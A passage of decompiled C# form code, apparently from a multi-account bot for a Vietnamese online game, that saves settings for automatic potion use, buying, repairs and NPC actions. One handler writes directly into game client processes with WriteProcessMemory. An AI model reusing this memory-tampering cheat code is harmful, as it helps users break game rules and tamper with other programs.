				Class75.smethod_52(characterAccountConfig_1[num2], text3);
			}
			break;
		case 1:
			buttonUuTien.Text = "Ưu tiên";
			characterAccountConfig_1[num2].int_143 = 0;
			text3 = "<color=green>ChÕ ®é : Ngò Hµnh";
			if (timer_3.Enabled && bool_23)
			{
				Class75.smethod_52(characterAccountConfig_1[num2], text3);
			}
			break;
		case 2:
			buttonUuTien.Text = "Ưu tiên";
			characterAccountConfig_1[num2].int_143 = 1;
			text3 = "<color=green>ChÕ ®é : M«n ph\u00b8i";
			if (timer_3.Enabled && bool_23)
			{
				Class75.smethod_52(characterAccountConfig_1[num2], text3);
			}
			break;
		default:
			buttonUuTien.Text = "Áp dụng";
			characterAccountConfig_1[num2].int_143 = 0;
			text3 = "<color=green>ChÕ ®é : Kho¶ng C\u00b8ch";
			if (timer_3.Enabled && bool_23)
			{
				Class75.smethod_52(characterAccountConfig_1[num2], text3);
			}
			break;
		}
		characterAccountConfig_1[num2].int_88 = num;
		Class56.smethod_13(characterAccountConfig_1[num2]);
	}

	private void checkBoxMangtheotien_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_65 = Convert.ToByte(checkBoxMangtheotien.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void textBoxTienMangtheo_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_66 = Class11.smethod_11(textBoxTienMangtheo.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void textBoxPass_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].string_15 = textBoxPass.Text;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxMua1_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_71[0] = Convert.ToByte(checkBoxMua1.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void method_14(ComboBox comboBox_0)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		string_23 = new string[3] { "Kim S\u00b8ng D\u00adîc (tiÓu)", "Ng\u00adng ThÇn ®an (tiÓu)", "Long §µm Hãa §éc ®an" };
		bool flag = false;
		for (int i = 0; i < string_23.Length; i++)
		{
			if (string_23[i] == characterAccountConfig.string_11)
			{
				flag = true;
				break;
			}
		}
		if (!flag)
		{
			Array.Resize(ref string_23, string_23.Length + 1);
			string_23[string_23.Length - 1] = characterAccountConfig.string_11;
		}
		flag = false;
		for (int j = 0; j < string_23.Length; j++)
		{
			if (string_23[j] == characterAccountConfig.string_12)
			{
				flag = true;
				break;
			}
		}
		if (!flag)
		{
			Array.Resize(ref string_23, string_23.Length + 1);
			string_23[string_23.Length - 1] = characterAccountConfig.string_12;
		}
		flag = false;
		for (int k = 0; k < string_23.Length; k++)
		{
			if (string_23[k] == characterAccountConfig.string_13)
			{
				flag = true;
				break;
			}
		}
		if (!flag)
		{
			Array.Resize(ref string_23, string_23.Length + 1);
			string_23[string_23.Length - 1] = characterAccountConfig.string_13;
		}
		CharacterAccountConfig characterAccountConfig2 = characterAccountConfig;
		int[] array = new int[1];
		Class85.smethod_38(characterAccountConfig2, ref string_23, 3, array);
		Array.Sort(string_23);
		bool_23 = false;
		string text = null;
		string text2 = comboBox_0.Text;
		comboBox_0.Items.Clear();
		for (int l = 0; l < string_23.Length; l++)
		{
			string text3 = Class1.smethod_1(string_23[l], 1);
			comboBox_0.Items.Add(text3);
			if (text2 == text3)
			{
				text = text2;
			}
		}
		if (text2 != null && text2 != string.Empty && text == null)
		{
			comboBox_0.Items.Add(text2);
			text = text2;
		}
		comboBox_0.Text = text;
		Thread.Sleep(10);
		bool_23 = true;
	}

	private void comboBoxMua1_MouseDown(object sender, MouseEventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			method_14(comboBoxMua1);
		}
	}

	private void comboBoxMua1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_23 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxMua1.Text;
		int num2 = 0;
		while (true)
		{
			if (num2 < string_23.Length)
			{
				if (text == Class1.smethod_1(string_23[num2], 1))
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		characterAccountConfig_1[num].string_11 = string_23[num2];
		Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
		Class56.smethod_13(characterAccountConfig_1[num]);
	}

	private void textBoxSoluong1_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_71[2] = Class11.smethod_11(textBoxSoluong1.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void checkBoxMua2_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_72[0] = Convert.ToByte(checkBoxMua2.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void comboBoxMua2_MouseDown(object sender, MouseEventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			method_14(comboBoxMua2);
		}
	}

	private void comboBoxTenThuocMienphi_MouseDown(object sender, MouseEventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			method_14(comboBoxTenThuocMienphi);
		}
	}

	private void comboBoxTenThuocMienphi_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_23 == null)
		{
			return;
		}
		string text = comboBoxTenThuocMienphi.Text;
		int num = 0;
		while (true)
		{
			if (num < string_23.Length)
			{
				if (text == Class1.smethod_1(string_23[num], 1))
				{
					break;
				}
				num++;
				continue;
			}
			return;
		}
		string_35 = string_23[num];
		Class66.smethod_11(Class66.smethod_1(), "TenMauFree", string_35, "", 0);
	}

	private void comboBoxMua2_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_23 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxMua2.Text;
		for (int i = 0; i < string_23.Length; i++)
		{
			if (text == Class1.smethod_1(string_23[i], 1))
			{
				characterAccountConfig_1[num].string_12 = string_23[i];
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
				break;
			}
		}
	}

	private void textBoxSoluong2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_72[2] = Class11.smethod_11(textBoxSoluong2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void checkBoxMuaTDP_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_59[0] = Convert.ToByte(checkBoxMuaTDP.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagMuaTDP_0", int_59[0], "", 0);
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void textBoxSoluongTDP_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_59[1] = Class11.smethod_11(textBoxSoluongTDP.Text);
			Class66.smethod_11(Class66.smethod_1(), "flagMuaTDP_1", int_59[1], "", 0);
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void textBoxSoluongThuocDimua_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_60 = Class11.smethod_11(textBoxSoluongThuocDimua.Text);
			Class66.smethod_11(Class66.smethod_1(), "ValueThuocDimua", int_60, "", 0);
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void checkBoxBomHP_CheckedChanged(object sender, EventArgs e)
	{
		Stopwatch stopwatch = Stopwatch.StartNew();
		try
		{
			long elapsedTicks = stopwatch.ElapsedTicks;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			long elapsedTicks2 = stopwatch.ElapsedTicks;
			double num2 = (double)(elapsedTicks2 - elapsedTicks) * 1000.0 / (double)Stopwatch.Frequency;
			if (num >= 0)
			{
				long elapsedTicks3 = stopwatch.ElapsedTicks;
				characterAccountConfig_1[num].int_109[0] = Convert.ToByte(checkBoxBomHP.Checked);
				long elapsedTicks4 = stopwatch.ElapsedTicks;
				double num3 = (double)(elapsedTicks4 - elapsedTicks3) * 1000.0 / (double)Stopwatch.Frequency;
				long elapsedTicks5 = stopwatch.ElapsedTicks;
				method_15(characterAccountConfig_1[num]);
				long elapsedTicks6 = stopwatch.ElapsedTicks;
				double num4 = (double)(elapsedTicks6 - elapsedTicks5) * 1000.0 / (double)Stopwatch.Frequency;
				stopwatch.Stop();
				double totalMilliseconds = stopwatch.Elapsed.TotalMilliseconds;
				method_45($"BomHP (Checked={checkBoxBomHP.Checked}): " + $"Search={num2:F3}ms, Update={num3:F3}ms, " + $"AsyncStart={num4:F3}ms, Total={totalMilliseconds:F3}ms, Index={num}");
			}
			else
			{
				stopwatch.Stop();
				method_45($"BomHP (Checked={checkBoxBomHP.Checked}): FAILED - Index not found, " + $"Total={stopwatch.Elapsed.TotalMilliseconds:F3}ms");
			}
		}
		catch (Exception ex)
		{
			stopwatch.Stop();
			method_45($"BomHP ERROR: {ex.Message}, Total={stopwatch.Elapsed.TotalMilliseconds:F3}ms");
		}
	}

	private void method_15(CharacterAccountConfig characterAccountConfig_2)
	{
		ThreadPool.QueueUserWorkItem(delegate
		{
			Stopwatch stopwatch = Stopwatch.StartNew();
			try
			{
				Class56.smethod_13(characterAccountConfig_2);
				stopwatch.Stop();
				method_45($"Async Save Completed: {stopwatch.Elapsed.TotalMilliseconds:F3}ms");
			}
			catch (Exception ex)
			{
				stopwatch.Stop();
				method_45($"Async Save ERROR: {ex.Message}, Time: {stopwatch.Elapsed.TotalMilliseconds:F3}ms");
			}
		});
	}

	private void method_16(int int_159 = 10)
	{
		method_45($"=== STARTING PERFORMANCE TEST ({int_159} iterations) ===");
		for (int i = 0; i < int_159; i++)
		{
			method_45($"--- Test iteration {i + 1} ---");
			checkBoxBomHP.Checked = !checkBoxBomHP.Checked;
			Thread.Sleep(50);
			checkBoxBomHPDiem.Checked = !checkBoxBomHPDiem.Checked;
			Thread.Sleep(50);
		}
		method_45("=== PERFORMANCE TEST COMPLETED ===");
	}

	private void textBoxHPBom_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_109[1] = Class11.smethod_11(textBoxHPBom.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxThoigianBomHP_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_109[2] = Class11.smethod_11(textBoxThoigianBomHP.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxSoluongBomHP_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class11.smethod_11(textBoxSoluongBomHP.Text);
			if (num2 < 0 || num2 > 60)
			{
				num2 = 1;
			}
			characterAccountConfig_1[num].int_109[3] = num2;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void checkBoxMPBom_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_111[0] = Convert.ToByte(checkBoxMPBom.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxMPBom_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_111[1] = Class11.smethod_11(textBoxMPBom.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxThoigianBomMP_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_111[2] = Class11.smethod_11(textBoxThoigianBomMP.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxSoluongBomMP_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class11.smethod_11(textBoxSoluongBomMP.Text);
			if (num2 < 0 || num2 > 60)
			{
				num2 = 1;
			}
			characterAccountConfig_1[num].int_111[3] = num2;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void checkBoxBomHPDiem_CheckedChanged(object sender, EventArgs e)
	{
		Stopwatch stopwatch = Stopwatch.StartNew();
		try
		{
			long elapsedTicks = stopwatch.ElapsedTicks;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			long elapsedTicks2 = stopwatch.ElapsedTicks;
			double num2 = (double)(elapsedTicks2 - elapsedTicks) * 1000.0 / (double)Stopwatch.Frequency;
			if (num >= 0)
			{
				long elapsedTicks3 = stopwatch.ElapsedTicks;
				characterAccountConfig_1[num].int_106[0] = Convert.ToByte(checkBoxBomHPDiem.Checked);
				long elapsedTicks4 = stopwatch.ElapsedTicks;
				double num3 = (double)(elapsedTicks4 - elapsedTicks3) * 1000.0 / (double)Stopwatch.Frequency;
				long elapsedTicks5 = stopwatch.ElapsedTicks;
				method_15(characterAccountConfig_1[num]);
				long elapsedTicks6 = stopwatch.ElapsedTicks;
				double num4 = (double)(elapsedTicks6 - elapsedTicks5) * 1000.0 / (double)Stopwatch.Frequency;
				stopwatch.Stop();
				double totalMilliseconds = stopwatch.Elapsed.TotalMilliseconds;
				method_45($"BomHPDiem (Checked={checkBoxBomHPDiem.Checked}): " + $"Search={num2:F3}ms, Update={num3:F3}ms, " + $"AsyncStart={num4:F3}ms, Total={totalMilliseconds:F3}ms, Index={num}");
			}
			else
			{
				stopwatch.Stop();
				method_45($"BomHPDiem (Checked={checkBoxBomHPDiem.Checked}): FAILED - Index not found, " + $"Total={stopwatch.Elapsed.TotalMilliseconds:F3}ms");
			}
		}
		catch (Exception ex)
		{
			stopwatch.Stop();
			method_45($"BomHPDiem ERROR: {ex.Message}, Total={stopwatch.Elapsed.TotalMilliseconds:F3}ms");
		}
	}

	private void textBoxBomHPDiem_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_106[1] = Class11.smethod_11(textBoxBomHPDiem.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxThoiGianBomHPDiem_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_106[2] = Class11.smethod_11(textBoxThoiGianBomHPDiem.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxSoLuongBomHPDiem_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class11.smethod_11(textBoxSoLuongBomHPDiem.Text);
			if (num2 < 0 || num2 > 60)
			{
				num2 = 1;
			}
			characterAccountConfig_1[num].int_106[3] = num2;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void checkBoxBomMPDiem_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_107[0] = Convert.ToByte(checkBoxBomMPDiem.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxBomMPDiem_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_107[1] = Class11.smethod_11(textBoxBomMPDiem.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxThoiGianBomMPDiem_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_107[2] = Class11.smethod_11(textBoxThoiGianBomMPDiem.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxSoLuongBomMPDiem_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class11.smethod_11(textBoxSoLuongBomMPDiem.Text);
			if (num2 < 0 || num2 > 60)
			{
				num2 = 1;
			}
			characterAccountConfig_1[num].int_107[3] = num2;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void checkBoxHPTdp_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_113[0] = Convert.ToByte(checkBoxHPTdp.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxHpTDP_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_113[1] = Class11.smethod_11(textBoxHpTDP.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxMPTdp_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_114[0] = Convert.ToByte(checkBoxMPTdp.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxMPTdp_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_114[1] = Class11.smethod_11(textBoxMPTdp.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonTatcaLuuruong_Click(object sender, EventArgs e)
	{
		Class46.characterSyncSnapshot_0.int_9 = 103;
		if (characterAccountConfig_1 != null)
		{
			int num = 0;
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				byte[] byte_ = new byte[1] { Convert.ToByte(characterAccountConfig_1[i].bool_25) };
				Class24.WriteProcessMemory(characterAccountConfig_1[i].int_137, characterAccountConfig_1[i].uint_16 + Class75.uint_33 * 4, byte_, 1, ref num);
			}
		}
	}

	private void buttonTatcaTDP_Click(object sender, EventArgs e)
	{
		Class46.characterSyncSnapshot_0.int_9 = 104;
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (characterAccountConfig_1[i].bool_25)
			{
				Class64.smethod_14(characterAccountConfig_1[i]);
			}
		}
	}

	private void buttonBungThuoc_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			FormTip.smethod_0(string_49, "Hãy chọn 1 ac rồi bấm nút < Bung thuốc > này.", 60000, 250, 100);
			return;
		}
		if (characterAccountConfig_1[num].uint_17 == 0)
		{
			characterAccountConfig_1[num].uint_18 = 0u;
			characterAccountConfig_1[num].uint_17 = Class24.smethod_1(characterAccountConfig_1[num].int_137);
			if (characterAccountConfig_1[num].uint_17 == 0)
			{
				return;
			}
			Class75.smethod_8(ref characterAccountConfig_1[num]);
		}
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		string[,] array = new string[5, 3]
		{
			{ "Ngò Hoa Ngäc Lé Hoµn", "Thõa Tiªn MËt", null },
			{ "Cöu ChuyÓn Hoµn Hån ®an", "Håi Thiªn ®an", "Kim S\u00b8ng D\u00adîc" },
			{ "¤ ®Çu Hoµn thÇn ®an", "§¹i Bæ t\u00b8n", "Ng\u00adng ThÇn ®an" },
			{ "Ng©n KiÒu Khø ®éc ®an", "Ho¾c H\u00ad¬ng ChÝnh khÝ hoµn", null },
			{ "Tam Hoa T\u00b8n", null, null }
		};
		for (int i = 0; i < array.GetLength(0); i++)
		{
			for (int j = 0; j < array.GetLength(1); j++)
			{
				if (array[i, j] != null)
				{
					uint num2 = Class85.smethod_30(characterAccountConfig, array[i, j], bool_3: false, 3u, bool_4: true);
					if (num2 != 0)
					{
						Class75.smethod_103(characterAccountConfig, num2);
						Thread.Sleep(300);
						break;
					}
				}
			}
		}
	}

	private void buttonSuadoTaicho_Click(object sender, EventArgs e)
	{
		if (int_152 == 0)
		{
			int_152 = 1;
		}
	}

	private void method_17()
	{
		bool flag = false;
		if (characterAccountConfig_1 != null)
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				if (characterAccountConfig_1[i].bool_25)
				{
					Class75.smethod_52(characterAccountConfig_1[i], "§ang kiÓm tra söa ®å tÊt c¶.");
					Class85.smethod_40(characterAccountConfig_1[i], 0, 0);
					Class64.smethod_3(characterAccountConfig_1[i], ref flag);
				}
			}
		}
		Thread.Sleep(300);
		int_152 = 3;
	}

	private void buttonComboNhoithuoc_Click(object sender, EventArgs e)
	{
		if (Combo.bool_0)
		{
			Combo.bool_0 = false;
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			FormTip.smethod_0(string_49, "Hãy chọn 1 ac rồi bấm nút Combox này.", 60000, 250, 100);
			return;
		}
		try
		{
			Combo combo = new Combo();
			combo.int_0 = base.Left;
			combo.int_1 = base.Top;
			combo.int_2 = base.Width;
			combo.int_3 = base.Height;
			combo.characterAccountConfig_0 = default(CharacterAccountConfig);
			combo.characterAccountConfig_0 = characterAccountConfig_1[num];
			combo.Show();
		}
		catch
		{
		}
	}

	private void checkBoxAccPhuHauDoanh_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_95 = Convert.ToByte(checkBoxAccPhuHauDoanh.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagAccPhuChoAccChinh", int_95, "", 0);
		}
	}

	private void checkBoxAccChinhHauDoanh_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_94 = Convert.ToByte(checkBoxAccChinhHauDoanh.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagAccChinhRoiHauDoanh", int_94, "", 0);
		}
	}

	private void comboBoxBentau_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		string text = comboBoxBentau.Text;
		for (int i = 0; i < string_36.Length; i++)
		{
			if (text == string_36[i])
			{
				int_111 = i;
				break;
			}
		}
		Class66.smethod_11(Class66.smethod_1(), "flagIndexBentau", int_111, "", 0);
	}

	private void buttonNopLenhbai_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			if (int_111 == 8)
			{
				string text = Class75.smethod_122(characterAccountConfig_1[num], bool_0: false);
				if (text != null && text != string.Empty)
				{
					Clipboard.SetText(text);
					string text2 = "DA COPY VAO CLIPBOARD";
					FormTip.smethod_0(text2, text, 9999999, 300, 160, bool_8: true);
				}
			}
			else if (int_111 != 7)
			{
				if (int_111 != 6)
				{
					if (characterAccountConfig_1[num].bool_25)
					{
						if (int_24 != 0 || characterAccountConfig_1[num].bool_15)
						{
							return;
						}
						if (int_111 > 2)
						{
							if (int_111 != 3 && int_111 != 4)
							{
								if (int_111 == 5)
								{
									FormClickNPC.int_9 = characterAccountConfig_1[num].int_136;
									new Thread(FormClickNPC.smethod_2).Start();
								}
							}
							else
							{
								characterAccountConfig_1[num].bool_55 = characterAccountConfig_1[num].bool_25;
							}
						}
						else
						{
							Class11.smethod_38(ref Class43.int_0, characterAccountConfig_1[num].int_136);
							if (!Class43.bool_0)
							{
								Class43.smethod_0();
							}
						}
					}
					else
					{
						FormTip.smethod_0(string_49, "Hãy stick vào ac rồi bấm nút lệnh này.", 4000, 250, 80);
					}
					return;
				}
				int num2 = 0;
				string text3 = null;
				int num3 = Class95.smethod_0(characterAccountConfig_1[num]);
				if (num3 >= 0)
				{
					if (num3 >= 1)
					{
						num2 = Class95.Class91.smethod_0(characterAccountConfig_1[num]);
						if (num2 > 0)
						{
							for (int i = 0; i < num2; i++)
							{
								if (text3 != null)
								{
									text3 += Class56.string_7;
								}
								text3 += Class95.smethod_3(characterAccountConfig_1[num], i, 1, 128);
							}
						}
					}
					num2 = Class95.Class90.smethod_0(characterAccountConfig_1[num]);
					if (num3 != 1 && num2 > 0)
					{
						for (int j = 0; j < num2; j++)
						{
							if (text3 != null)
							{
								text3 += Class56.string_7;
							}
							text3 += Class95.smethod_3(characterAccountConfig_1[num], j, 0, 128);
						}
					}
				}
				string text4 = string_49;
				if (text3 != null)
				{
					Clipboard.SetText(text3);
					text4 = "DA COPY VAO CLIPBOARD";
				}
				else
				{
					text3 = "Không có menu text nào. Bạn hãy click vào xa phu rồi bấm nút này để lấy menu.";
				}
				FormTip.smethod_0(text4, text3, 9999999, 300, 160);
			}
			else
			{
				string text5 = Class85.smethod_43(characterAccountConfig_1[num]);
				if (text5 != null && text5 != string.Empty)
				{
					Clipboard.SetText(text5);
					string text6 = "DA COPY VAO CLIPBOARD";
					FormTip.smethod_0(text6, text5, 9999999, 300, 160, bool_8: true);
				}
			}
		}
		else
		{
			FormTip.smethod_0(string_49, "Hãy chọn 1 ac rồi bấm nút lệnh này.", 4000, 250, 80);
		}
	}

	private void buttonNopLenhbaiAll_Click(object sender, EventArgs e)
	{
		if (int_24 != 0 || characterAccountConfig_1 == null)
		{
			return;
		}
		if (int_111 > 2)
		{
			if (int_111 != 3 && int_111 != 4)
			{
				if (int_111 == 5)
				{
					Class46.characterSyncSnapshot_0.int_9 = int_111;
					new Thread(FormClickNPC.smethod_1).Start();
				}
			}
			else
			{
				Class46.characterSyncSnapshot_0.int_9 = int_111;
				for (int i = 0; i < characterAccountConfig_1.Length; i++)
				{
					characterAccountConfig_1[i].bool_55 = characterAccountConfig_1[i].bool_25;
				}
			}
			return;
		}
		bool flag = false;
		Class46.characterSyncSnapshot_0.int_9 = 100 + int_111;
		for (int j = 0; j < characterAccountConfig_1.Length; j++)
		{
			if (!characterAccountConfig_1[j].bool_15 && characterAccountConfig_1[j].bool_25)
			{
				Class11.smethod_38(ref Class43.int_0, characterAccountConfig_1[j].int_136);
				flag = true;
			}
		}
		if (flag && !Class43.bool_0)
		{
			Class43.smethod_0();
		}
	}

	private void buttonVaotraiStop_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
